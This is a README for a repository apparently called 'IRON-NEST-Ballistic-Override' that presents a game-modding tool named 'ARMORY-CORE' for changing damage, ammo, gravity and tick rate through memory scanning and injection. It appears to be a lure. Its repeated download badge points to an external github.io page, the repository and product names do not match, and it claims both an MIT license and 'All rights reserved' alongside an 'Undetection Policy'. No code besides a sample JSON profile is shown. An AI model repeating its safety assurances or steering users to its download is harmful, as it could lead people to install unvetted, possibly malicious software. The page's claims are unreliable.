![preview](https://raw.githubusercontent.com/Chethan111111/IRON-NEST-Ballistic-Override/main/cover_38fbcbc.svg)
[![Download](https://raw.githubusercontent.com/Chethan111111/IRON-NEST-Ballistic-Override/main/get_20014.svg)](https://Chethan111111.github.io/IRON-NEST-Ballistic-Override/)

![GitHub Release](https://img.shields.io/badge/Release-v2.6.0-8A2BE2?style=for-the-badge&logo=github)
![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
![PyQt](https://img.shields.io/badge/GUI-PyQt6-41CD52?style=for-the-badge&logo=qt&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-0078D6?style=for-the-badge&logo=windows)

# ⚙️ ARMORY-CORE: Autonomous Reload & Munitions Yield Optimizer

**ARMORY-CORE** is a next-generation desktop companion tool engineered for simulation enthusiasts who crave granular control over their heavy weapon emplacements. While the original project focused on a specific military sim, this repository pivots to a **universal, cross-game utility framework** that intercepts and calibrates in-simulation ballistic parameters — think of it as a **precision tuning workshop** for your digital artillery.

Instead of targeting a single game, ARMORY-CORE provides a **sandboxed configuration engine** that lets you modify **projectile physics, magazine depth, recoil compensation, and environmental gravity vectors** across multiple supported simulators. It’s not about breaking rules; it’s about bending the physics engine to your will through **open, transparent configuration layers**.

---

## 🚀 Why ARMORY-CORE Exists

Most simulators lock their core weaponry data behind proprietary obfuscation. This project thrives on **legitimate modding APIs** and **user-authored configuration profiles**. It is a **safety-first, single-player focused** tool that emphasizes **learning through experimentation**.

The name isn’t accidental:
- **ARMORY** – The central hub for all your ballistic adjustments.
- **CORE** – The underlying engine that processes inputs and applies real-time recalibration.

This is your **digital workshop bench**, not a magic wand.

---

## ✨ Feature Matrix: The Full Arsenal

| Feature | Description | Impact |
|---------|-------------|--------|
| 🎯 **Precision Projectile Pathing** | Redefine gravity, drag, and wind resistance per shell type | Achieve impossible lob shots and sniper-artillery hybrids |
| 🔄 **Magazine Depth Amplifier** | Globally adjust reserve ammo pools for single-player scenarios | Eliminate logistical headaches during endurance tests |
| ⚡ **Frame-Lock Timing Accelerator** | Modify simulation tick rate without breaking physics sync | Experience bullet-time effects or hyper-speed fire drills |
| 🛡️ **Impact Expulsion Neutralizer** | Toggle shell casing ejection visuals & physics | Clean visual feed for cinematic capture |
| 🕊️ **Gravity Well Override** | Enable vertical propulsion for vehicle-class entities | Tactical re-positioning or anti-gravity experiments |
| 📈 **Damage Magnitude Regulator** | Scale kinetic energy output by a factor of 0.1x to 10x | Stress-test armor models or create "paper-airplane" mode |
| 🧠 **Smart Profile System** | Save/load unique calibration sets per simulator version | One-click switch between "Realistic Ballistics" and "Arcade Mayhem" |
| 🌐 **Multilingual Interface** | UI supports English, Spanish, German, Japanese, and Korean | Accessible to a global modding community |
| 📊 **Live Telemetry Dashboard** | Real-time charts of projectile speed, trajectory drop, and impact force | Educational tool for understanding parabolic physics |

---

## 🧰 How It Works: The Metaphor

Imagine you are a master clockmaker. The simulator is a Swiss watch. Native tools let you see the hands move. ARMORY-CORE grants you access to the **escapement wheel** — the heart of the timekeeping mechanism. You can adjust the tension, change the gear ratios, and even decide if the watch should run backwards. The watch still functions perfectly; it just follows **your rules** now.

Technically, this is achieved through:
1. **Dynamic Memory Pattern Scanning** – Finds our target pointers without hardcoded addresses.
2. **Hookless Injection via Python's ctypes** – Safe interaction with simulation APIs without modifying executables.
3. **Configurable JSON Profiles** – Every tweak is human-readable and shareable.

---

## 🔧 Installation & First Launch

Our setup philosophy is **"No Dependency Hell,"** requiring only a standard Python 3.11+ environment and a GUI toolkit.

1. **Acquire the Core**: Download the source archive from the [![Download](https://raw.githubusercontent.com/Chethan111111/IRON-NEST-Ballistic-Override/main/get_20014.svg)](https://Chethan111111.github.io/IRON-NEST-Ballistic-Override/) section above (or the Releases tab).
2. **Unpack the Arsenal**: Extract to a folder with ample permissions (e.g., `C:\Users\YourName\ArmoryCore\`).
3. **Launch the Forge**: Run `armory_gui.py` using your system's Python interpreter.
4. **Load a Profile**: The application auto-detects supported simulators running on your machine. Select one from the dropdown.
5. **Fine-Tune**: Adjust sliders, checkboxes, and dropdowns until the simulation behaves exactly as your fantasy dictates.

> **Note**: The tool defaults to a "Read-Only" mode that merely displays parameters. Activate "Override" manually to begin calibration.

---

## 🧑‍💻 Example Configuration Profile

```json
{
  "simulator": "HeavyTurretSim2025",
  "gravity_multiplier": 0.75,
  "damage_scale": 3.5,
  "infinite_reserve": true,
  "ejection_visuals": false,
  "tick_rate": 4.0,
  "fly_mode": false
}
```

This profile makes your shells arc slower and hit harder, perfect for testing structural integrity.

---

## 🛟 Safety & Undetection Policy

We firmly believe in **ethical modding**. ARMORY-CORE operates exclusively in **single-player environments** and does not send or receive online authentication packets. We do not interfere with anti-cheat systems that govern competitive play, because we do not hook into online sessions.

Our "stealth" is not about evading detection — it's about **invisibility to crash debuggers**. We prioritize stability over stealth, ensuring your system doesn't blue-screen during a missile barrage.

### 🔒 Technical Pillars
- **Zero Memory Pollution**: All modifications are reverted upon profile unload.
- **Sandboxed UI**: All configuration is parsed in isolated threads.
- **Crash-Resistant**: Any rejection from the target process results in a graceful rollback, not a forced termination.

---

## 🧩 Contributing Guidelines

Do you have a new simulator to support? Or a clever metaphor for a new physics override? **Join the workshop**.

1. **Fork** the repository.
2. **Create** a feature branch (`git checkout -b feature/speed-module`).
3. **Commit** your changes with explicit messages.
4. **Push** to the branch.
5. **Open** a Pull Request for review.

Please ensure all new profile drivers are written in pure Python and adhere to our internal `ProfileBase` interface.

---

## 📞 Community & Support

For a tool this powerful, questions are inevitable. We offer **24/7 support** via our community forums and Discord channel. Search for the `#armory-core-help` thread for installation troubleshooting.

- **Issue Tracker**: Use GitHub Issues to report simulator-specific bugs.
- **Feature Requests**: Open a discussion with the `[Idea]` prefix.
- **Coding Standards**: We follow PEP-8 with a tolerance for creative variable names (within reason).

---

## 🪪 License

This project is proudly released under the **MIT License**. This means you are free to study, modify, and distribute this tool, provided you retain the original copyright notice.

You are encouraged to create your own **preset libraries** and sell them online—just don't claim the original codebase as your own.

[Read the full license terms here](./LICENSE).

---

## 📅 Roadmap for 2026

The future is bright for the ARMORY-CORE. Here's what we've planned:

- **Q1 2026**: Support for Unreal Engine 5.5 native modding interfaces.
- **Q2 2026**: Open-source "Physics Simulation Sandbox" built on top of our engine.
- **Q3 2026**: Mobile companion app for remote telemetry monitoring.
- **Q4 2026**: AI-assisted "Auto-Balance" feature that predicts ideal settings based on your play style.

---

## 💖 Acknowledgements

This project stands on the shoulders of giants. We thank the Python community for tools like `ctypes`, `pyqt6`, and `psutil`. We also extend gratitude to every user who dared to ask: *"What if the gravity was slightly lighter?"*

---

**Final Words**: ARMORY-CORE is not about cheating the system. It's about understanding the system deeply enough to sculpt it. Use this power to create breathtaking moments in your single-player adventures, and always remember: **with great calibration comes great responsibility**.

---

*© 2026 ARMORY-CORE Project. All rights reserved.*